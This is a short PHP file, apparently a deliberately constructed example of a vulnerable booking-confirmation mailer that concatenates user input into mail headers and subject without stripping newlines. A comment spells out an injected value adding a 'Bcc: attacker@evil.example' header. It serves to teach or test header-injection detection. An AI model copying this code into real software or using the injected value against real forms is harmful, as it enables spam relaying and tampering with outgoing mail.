<?php
// Manufactured, representative of a common real anti-pattern: a booking-
// confirmation email built with raw string concatenation instead of
// PHPMailer's (or an equivalent library's) header-safe setters --
// derived from idiomatic-phpmailer-secureheader-1.php's contrast, since
// PHPMailer's own secureHeader() exists specifically because naive
// header construction like this is a real, historical vulnerability
// class in PHP mail code.

function sendBookingConfirmation(string $guestName, string $guestEmail, string $specialRequests): void
{
    // No newline stripping on any of these fields -- $guestName or
    // $specialRequests containing "\r\nBcc: attacker@evil.example" adds
    // an attacker-controlled header to the outgoing message.
    $headers = "From: bookings@example.com\r\n";
    $headers .= "Reply-To: {$guestEmail}\r\n";
    $subject = "Booking confirmed for {$guestName}";
    $body = "Special requests: {$specialRequests}";

    mail($guestEmail, $subject, $body, $headers);
}
